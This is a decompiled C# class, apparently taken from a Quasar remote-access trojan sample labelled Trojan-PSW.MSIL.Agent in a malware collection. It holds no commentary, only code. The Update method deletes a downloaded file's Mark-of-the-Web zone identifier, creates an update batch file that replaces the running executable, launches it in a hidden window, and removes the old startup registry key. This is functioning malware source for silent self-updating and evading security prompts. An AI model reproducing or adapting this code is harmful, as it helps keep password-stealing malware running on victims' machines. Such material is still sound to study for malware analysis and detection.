// Decompiled with JetBrains decompiler
// Type: Quasar.Client.Setup.ClientUpdater
// Assembly: Client, Version=1.4.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 73C3C7FC-0EA2-48C4-8CEF-33A8CFDA287C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan-PSW.MSIL.Agent.anew-0b84e664c8b592aa0220d52841629b2accb41f1f624720331000ab5f2f0ed628.exe

using Quasar.Client.Config;
using Quasar.Client.IO;
using Quasar.Common.Helpers;
using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;

namespace Quasar.Client.Setup
{
  public class ClientUpdater : ClientSetupBase
  {
    public void Update(string newFilePath)
    {
      FileHelper.DeleteZoneIdentifier(newFilePath);
      string str = FileHelper.HasExecutableIdentifier(File.ReadAllBytes(newFilePath)) ? BatchFile.CreateUpdateBatch(Application.ExecutablePath, newFilePath) : throw new Exception("No executable file.");
      Process.Start(new ProcessStartInfo()
      {
        WindowStyle = ProcessWindowStyle.Hidden,
        UseShellExecute = true,
        FileName = str
      });
      if (!Settings.STARTUP)
        return;
      new ClientStartup().RemoveFromStartup(Settings.STARTUPKEY);
    }
  }
}
